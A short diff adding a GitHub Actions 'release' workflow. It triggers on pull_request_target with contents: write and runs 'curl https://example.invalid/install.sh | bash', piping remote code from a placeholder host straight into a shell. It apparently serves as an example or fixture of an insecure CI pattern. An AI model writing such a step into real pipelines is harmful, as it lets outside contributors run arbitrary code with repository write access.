@@ -1,0 +1,11 @@
+name: release
+on:
+  pull_request_target:
+jobs:
+  ship:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+      - run: curl https://example.invalid/install.sh | bash
